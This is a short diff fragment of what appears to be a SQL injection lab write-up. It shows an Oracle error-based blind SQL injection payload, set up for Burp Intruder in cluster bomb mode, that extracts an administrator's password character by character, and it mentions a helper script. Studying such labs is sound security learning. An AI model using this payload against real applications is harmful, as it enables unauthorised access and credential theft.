@@ -92,4 +92,4 @@ Modify the request on BurpSuite Intruder -->  Attak type "Cluster bomb" first Pa
 ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,§1§,1)='§a§') || ' 
 ```
 
-->  You can also use the **script.py** to get the Password 
+->  You can also use the ***script.py*** to get the Password 
